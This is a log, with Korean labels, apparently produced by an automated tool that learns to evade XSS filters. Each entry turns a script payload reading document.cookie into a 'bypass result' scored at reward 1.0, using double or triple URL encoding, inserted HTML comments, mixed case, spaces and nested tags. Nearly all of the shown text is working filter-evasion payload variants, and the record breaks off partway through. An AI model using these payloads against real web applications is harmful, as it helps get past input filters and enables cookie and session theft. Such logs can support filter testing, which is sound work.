# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27VVQE0YUT1WZZSL0YN1KLDVEWFAXPK1ZMUIRB1XJUB5TAVMQ2VM%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [101/874] 원본: <script>console.log('J9QEX8ESN90YYJUMIHXD7B60B0RVXX9P4TL2NPA2Y5IT2HZIN9');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27J9QEX8ESN90YYJUMIHXD7B60B0RVXX9P4TL2NPA2Y5IT2HZIN9%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [102/874] 원본: <script>console.log('WHYJ43GMBQG8TBPFO2F9XT9P1VW9INBNM0JOG2ZRAP7IOHW98C');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253CsCrIPt%253EcONsoLe.loG%2528%2527whyj43GmBqG8tbpfo2f9Xt9p1vw9INBnm0JOG2ZRap7ioHw98C%2527%2529%253BcONSOlE.lOg%2528DOCUMenT.COOKiE%2529%253B%253C/SCripT%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [103/874] 원본: <script>console.log('37YAZFQCOJXQ6HTVN3WMDYOJ797I1T9F870ZVDH7VMX8S30SUH');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253CScrIpT%253EcoNsoLe.log%2528%252737YaZfQcoJxq6HTVN3wmdYoJ797i1t9f870ZVDh7vmx8S30Suh%2527%2529%253BcONsOlE.LOg%2528dOCumeNt.cOOkIe%2529%253B%253C/scRiPT%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [104/874] 원본: <script>console.log('HSIP7HT7PRPUHWK6WYEB5BIQV88J93QCBYDPG7UJHBOYXRH0B0');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27HSIP7HT7PRPUHWK6WYEB5BIQV88J93QCBYDPG7UJHBOYXRH0B0%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [105/874] 원본: <script>console.log('LU8U0DCETQ9O2I0O7AMTJVKHBPBSEDZZEEFM4TVXNDQ3A0AYSQ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27LU8U0DCETQ9O2I0O7AMTJVKHBPBSEDZZEEFM4TVXNDQ3A0AYSQ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [106/874] 원본: <script>console.log('ZR9MW1DEGX25UBWV9HMOQ86UDC43HLOY5WSNVDTLEN0EG48ZUL');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27ZR9MW1DEGX25UBWV9HMOQ86UDC43HLOY5WSNVDTLEN0EG48ZUL%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [107/874] 원본: <script>console.log('NPDCLLYPJA38RPBBQRXVV1AC1I1D3V2Q3LLE66OB7AG46XLQNR');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27NPDCLLYPJA38RPBBQRXVV1AC1I1D3V2Q3LLE66OB7AG46XLQNR%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [108/874] 원본: <script>console.log('C0XIQ5YGJB57WFILIJT4AT86OJ9CMDJA283FNM1ZLYDQ341LV0');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('C0XIQ5YGJB57WFILIJT4AT86OJ9CMDJA283FNM1ZLYDQ341LV0');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [109/874] 원본: <script>console.log('E274DQG1DJB9ZAEVQQ3ULXGGPDTV36J76I83KNX150L98UDH5S');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27E274DQG1DJB9ZAEVQQ3ULXGGPDTV36J76I83KNX150L98UDH5S%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [110/874] 원본: <script>console.log('9042IO4AQJ57YXKRUINV60LO6HJ7P7Q8PBQTA61HPA1DZV74ZR');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%279042IO4AQJ57YXKRUINV60LO6HJ7P7Q8PBQTA61HPA1DZV74ZR%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [111/874] 원본: <script>console.log('Q9KGVMZTFHTKD4GNG3CRTIBO9V5B6QAIKWUOIIA73U6DCS6MXM');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27Q9KGVMZTFHTKD4GNG3CRTIBO9V5B6QAIKWUOIIA73U6DCS6MXM%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [112/874] 원본: <script>console.log('LGOSGRZW7T9LRV8JO9PQXG8HS74QX86V270SM6LSB9YWB8W4PH');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %25253Cscript%25253Econsole.log%252528%252527LGOSGRZW7T9LRV8JO9PQXG8HS74QX86V270SM6LSB9YWB8W4PH%252527%252529%25253Bconsole.log%252528document.cookie%252529%25253B%25253C/script%25253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [113/874] 원본: <script>console.log('DKYIRIOZWL44E34YPKSNKJCJZX05GPB09NKA8MQ79GD8UE0FGI');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27DKYIRIOZWL44E34YPKSNKJCJZX05GPB09NKA8MQ79GD8UE0FGI%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [114/874] 원본: <script>console.log('28PHPMG8RHRYG5R3342C7RZXMNTIFN5K43FVT7I8JADQV197HL');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('28PHPMG8RHRYG5R3342C7RZXMNTIFN5K43FVT7I8JADQV197HL');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [115/874] 원본: <script>console.log('M96YZ3LQBQQ6DXBF54ACJT8HONVUTKP79A0LC67LFC4Z7YZUZ8');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('M96YZ3LQBQQ6DXBF54ACJT8HONVUTKP79A0LC67LFC4Z7YZUZ8');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [116/874] 원본: <script>console.log('78IVSPNWLGZP6GDPQ36VOCK24POL1Z7YA39OAN7NQCNU5W032S');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('78IVSPNWLGZP6GDPQ36VOCK24POL1Z7YA39OAN7NQCNU5W032S');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [117/874] 원본: <script>console.log('PUMXCEE2ZHKCAOXSFTV0104FX4497UD6M326QFN9MA0ZJCPCM3');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27PUMXCEE2ZHKCAOXSFTV0104FX4497UD6M326QFN9MA0ZJCPCM3%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [118/874] 원본: <script>console.log('TA5I32XC1HMVKAQU0WHU3CBS5JVCBUWFCCUI6SPP21JTC6Y2SW');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27TA5I32XC1HMVKAQU0WHU3CBS5JVCBUWFCCUI6SPP21JTC6Y2SW%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [119/874] 원본: <script>console.log('1BOK7P4QT4X2KKKHX54S517H4834LUF7DH1U08FD14F881K3RS');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%271BOK7P4QT4X2KKKHX54S517H4834LUF7DH1U08FD14F881K3RS%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [120/874] 원본: <script>console.log('PYYDNGFFU8PGVSOUAXQANVQLUH7KYAVT4A4TKNBK8OMP6VX81R');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27PYYDNGFFU8PGVSOUAXQANVQLUH7KYAVT4A4TKNBK8OMP6VX81R%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [121/874] 원본: <script>console.log('XDM2PTV549JUUH9KJBXVJX3I1ARM1NFJXK8G40DN15QCZBOFZS');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27XDM2PTV549JUUH9KJBXVJX3I1ARM1NFJXK8G40DN15QCZBOFZS%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [122/874] 원본: <script>console.log('LDZGTATYCDOO9FGSGJV0VS6F8WSD9VAVDS4KI8AP8YVZCOPKOH');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253Cscript%253Econsole.log%2528%2527LDZGTATYCDOO9FGSGJV0VS6F8WSD9VAVDS4KI8AP8YVZCOPKOH%2527%2529%253Bconsole.log%2528document.cookie%2529%253B%253C/script%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [123/874] 원본: <script>console.log('PU43E637KCMVZVDPMXDMO3ZXQZVOGKR3QA9MBAGA5TB45NG1BM');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27PU43E637KCMVZVDPMXDMO3ZXQZVOGKR3QA9MBAGA5TB45NG1BM%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [124/874] 원본: <script>console.log('4ZZSR1713F9IXJOD0L0EQ62O1NPGFND1I2F06O1MJLF1Y8YHGA');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%274ZZSR1713F9IXJOD0L0EQ62O1NPGFND1I2F06O1MJLF1Y8YHGA%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [125/874] 원본: <script>console.log('A3DIN78MS5GVL2PSGUFZTJT8Q9PNGSNZXV8XPPK90BY53BCBUG');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27A3DIN78MS5GVL2PSGUFZTJT8Q9PNGSNZXV8XPPK90BY53BCBUG%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [126/874] 원본: <script>console.log('XAE6TA14CQI1V4F487SG2V3MASBHM8DQMU2DSNXS7UPS3MYAXS');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27XAE6TA14CQI1V4F487SG2V3MASBHM8DQMU2DSNXS7UPS3MYAXS%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [127/874] 원본: <script>console.log('X2KYEW8H8S9GCS98SCMEU4UXPPUYQ905DA7XOEUT0JJ7NHQOC4');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27X2KYEW8H8S9GCS98SCMEU4UXPPUYQ905DA7XOEUT0JJ7NHQOC4%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [128/874] 원본: <script>console.log('Y7YMKVIPOT73ILD551E73MB20HJ0DDMHQKD0H40QTOAB37OLHU');console.log(document.cookie);</script>
#
# ✅ 우회 결과: < !-- -- >scr< !-- -- >script >ipt >console.log('Y7YMKVIPOT73ILD551E73MB20HJ0DDMHQKD0H40QTOAB37OLHU');console.log(document.cookie);< !-- -- >/script >
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: space_injection
#
# [129/874] 원본: <script>console.log('1IQK0BLO56LEEN6TWS1CS4VRFBEUCJ6FSGL3D6U5SE1U8XSOD9');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%271IQK0BLO56LEEN6TWS1CS4VRFBEUCJ6FSGL3D6U5SE1U8XSOD9%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [130/874] 원본: <script>console.log('15KYQ33Q5P3F2B3E8UCW67QME60EJCAOUPGC06OD58L928RABW');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%2715KYQ33Q5P3F2B3E8UCW67QME60EJCAOUPGC06OD58L928RABW%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [131/874] 원본: <script>console.log('MU3QJ1NBAZ1RTGJK1QEXTXMP3CEEONDUW12YZ4RTO1WRM1ZT39');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27MU3QJ1NBAZ1RTGJK1QEXTXMP3CEEONDUW12YZ4RTO1WRM1ZT39%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [132/874] 원본: <script>console.log('60NLQ3A67E6IN3BQBPNE8D49URWXUFMX81JGTVXXWG2Z56I0AK');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%2760NLQ3A67E6IN3BQBPNE8D49URWXUFMX81JGTVXXWG2Z56I0AK%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [133/874] 원본: <script>console.log('617JYPMOLOVZSRASSINLBM19YKWLEURQRHTKSUR852Z3GYUDTM');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27617JYPMOLOVZSRASSINLBM19YKWLEURQRHTKSUR852Z3GYUDTM%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [134/874] 원본: <script>console.log('K73A8VP8UII65OND1VP09RLT8FUR5OL1JYKONI72ZE843I74BK');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253Cscr%253Cscript%253Eipt%253Econsole.log%2528%2527K73A8VP8UII65OND1VP09RLT8FUR5OL1JYKONI72ZE843I74BK%2527%2529%253Bconsole.log%2528document.cookie%2529%253B%253C/script%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [135/874] 원본: <script>console.log('KPSC1EDEBOSD0SPO5ENV83IL4JF3WVIXMU6APA32NDKIYPIVO2');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27KPSC1EDEBOSD0SPO5ENV83IL4JF3WVIXMU6APA32NDKIYPIVO2%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [136/874] 원본: <script>console.log('N1ELG1BL6E288XWJZ5A6XNQDE80H2BOSYXJKAMG4S658BPGU1P');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27N1ELG1BL6E288XWJZ5A6XNQDE80H2BOSYXJKAMG4S658BPGU1P%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [137/874] 원본: <script>console.log('HUNWDKCPWC3BGCWDSQWJUZO0G9AXEAL9L1NUWN6YY8P7YFBWZQ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27HUNWDKCPWC3BGCWDSQWJUZO0G9AXEAL9L1NUWN6YY8P7YFBWZQ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [138/874] 원본: <script>console.log('PERFSTH3JT5NRUQZT9PT6XD7ZI51O97RYI7DZUBOSHG04J0K9Y');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%27PERFSTH3JT5NRUQZT9PT6XD7ZI51O97RYI7DZUBOSHG04J0K9Y%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [139/874] 원본: <script>console.log('PGDCIIYGAJ4YW7DIRHNG80HUB7ZBVDTZ48G9BEXERU3JU7VR8A');console.log(document.cookie);</script>
#
# ...
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [829/874] 원본: <script>console.log('3W22RDUMX7GBP3FV0YHQJN4IONYUVMTX5TEJM6DYY97AW110CN');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%273W22RDUMX7GBP3FV0YHQJN4IONYUVMTX5TEJM6DYY97AW110CN%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [830/874] 원본: <script>console.log('CWNA68DRN68K6OWKTQCI4VTTSCF63LMOMMY5V067IB6UYR052C');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %253CSCRIpT%253EConsOLE.lOg%2528%2527cwna68drn68k6OWktqcI4VTtscF63LMoMMy5v067iB6uYR052C%2527%2529%253BconsOLe.LOG%2528doCUment.CookIE%2529%253B%253C/scRIpT%253E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [831/874] 원본: <script>console.log('8NKQENFF21724UZTOJPNZ4FLBV3B813ATICA9CR2NKZXPRR109');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%278NKQENFF21724UZTOJPNZ4FLBV3B813ATICA9CR2NKZXPRR109%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [832/874] 원본: <script>console.log('PWBDP8C8ICSEASWRRH5EEEQ1C96SB6ILC1XX6YKVKSAIZ5QCYR');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27PWBDP8C8ICSEASWRRH5EEEQ1C96SB6ILC1XX6YKVKSAIZ5QCYR%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [833/874] 원본: <script>console.log('90UAN02ZB2SH9ZWCLCMCQLE0TIHO5OR7AC1SMU868Z7NX5T5XV');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%2790UAN02ZB2SH9ZWCLCMCQLE0TIHO5OR7AC1SMU868Z7NX5T5XV%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [834/874] 원본: <script>console.log('XAKLP2F9YOF3IH3BS4TYHME67HY37C5259E5WWO4L2UDWIE3TL');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27XAKLP2F9YOF3IH3BS4TYHME67HY37C5259E5WWO4L2UDWIE3TL%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [835/874] 원본: <script>console.log('P3YZV9OXDWC8AG96XB1USXIT5BSXUKNMTIQJZF6O9SDVGSA5RQ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27P3YZV9OXDWC8AG96XB1USXIT5BSXUKNMTIQJZF6O9SDVGSA5RQ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [836/874] 원본: <script>console.log('0PTCV0VI8NUMJ4IOCPJM6GH7W8RXVRPMEE6C9LHJ9GZKMJ0JAO');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%270PTCV0VI8NUMJ4IOCPJM6GH7W8RXVRPMEE6C9LHJ9GZKMJ0JAO%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [837/874] 원본: <script>console.log('ZVEREN84B0VRHP54BKV6WG9A2HX5KL4AU6RZMTA7NUWDEWIHZ8');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27ZVEREN84B0VRHP54BKV6WG9A2HX5KL4AU6RZMTA7NUWDEWIHZ8%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [838/874] 원본: <script>console.log('YSDMOVF8KOIAS12A1OG5GNXUXQH37LUFYTUWB3NYX8M337P2I2');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27YSDMOVF8KOIAS12A1OG5GNXUXQH37LUFYTUWB3NYX8M337P2I2%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [839/874] 원본: <script>console.log('MMBG2ET99DED1PT22XMP0E3DFUIMZ7BGVCO0VFO4VX6S5NUMRB');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27MMBG2ET99DED1PT22XMP0E3DFUIMZ7BGVCO0VFO4VX6S5NUMRB%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [840/874] 원본: <script>console.log('K88VLOYHS9R9O5JC2GUFD5Y0B2TWQ1QTOKDGE2HSNQS1S18ZAE');console.log(document.cookie);</script>
#
# ✅ 우회 결과: <!-- -->!-- -->scr<!-- -->!-- -->script>ipt>console.log('K88VLOYHS9R9O5JC2GUFD5Y0B2TWQ1QTOKDGE2HSNQS1S18ZAE');console.log(document.cookie);<!-- -->!-- -->/script>
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: insert_comment
#
# [841/874] 원본: <script>console.log('2J903CCHF1WCO7W33N3CJMLFJCL162KQ8IVWF4LGM135JEV30K');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%272J903CCHF1WCO7W33N3CJMLFJCL162KQ8IVWF4LGM135JEV30K%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [842/874] 원본: <script>console.log('9RRJJ3IUNI2VYRGHY8R7FLVXG0OU9LODPZ2IBP5OEQH9YYSK13');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%279RRJJ3IUNI2VYRGHY8R7FLVXG0OU9LODPZ2IBP5OEQH9YYSK13%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [843/874] 원본: <script>console.log('MNRQ1ZETVX99IV1Q4RJWTHW82SGI0Y4B4WV26OT2SB7KN9NHT0');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27MNRQ1ZETVX99IV1Q4RJWTHW82SGI0Y4B4WV26OT2SB7KN9NHT0%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [844/874] 원본: <script>console.log('DS6GLWUCSLDSHXQ8268351CHA7G8G6W45XN2VIXQAWXLSV6M16');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27DS6GLWUCSLDSHXQ8268351CHA7G8G6W45XN2VIXQAWXLSV6M16%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [845/874] 원본: <script>console.log('98H6OON369EIA5MSC44XPQE77OI2SSXYB5IXF6U5U8ORI1775K');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%2798H6OON369EIA5MSC44XPQE77OI2SSXYB5IXF6U5U8ORI1775K%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [846/874] 원본: <script>console.log('CU9V6PFI9QOMNP15YKHNRHWXUDGS7I81O88CICHUDAHPG1PA94');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%27CU9V6PFI9QOMNP15YKHNRHWXUDGS7I81O88CICHUDAHPG1PA94%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [847/874] 원본: <script>console.log('8Y8688Z2ZYCF3GBJF3D8PMV877GGOVUVZQAPOS9HMH1NWGLGGJ');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escript%3Econsole.log%28%278Y8688Z2ZYCF3GBJF3D8PMV877GGOVUVZQAPOS9HMH1NWGLGGJ%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [848/874] 원본: <script>console.log('2VYBDL9WWE0GMEI0AI9VRT238DX9JQP63PENJSFFJBTNVJ6QMV');console.log(document.cookie);</script>
#
# ✅ 우회 결과: %3C%21--%20--%3Escr%3C%21--%20--%3Escript%3Eipt%3Econsole.log%28%272VYBDL9WWE0GMEI0AI9VRT238DX9JQP63PENJSFFJBTNVJ6QMV%27%29%3Bconsole.log%28document.cookie%29%3B%3C%21--%20--%3E/script%3E
# ⮕ 보상: 1.0000 | 방문 수: 1 | 적용 행동: url_encode
#
# [849/874] 원본: <script>console.log('54BTPPVAFG9U28BC7IJ0YHBAJD4HVHU0JZ5BNZ8AFMYLT8STKG');console.log(document.cookie);</script>
#
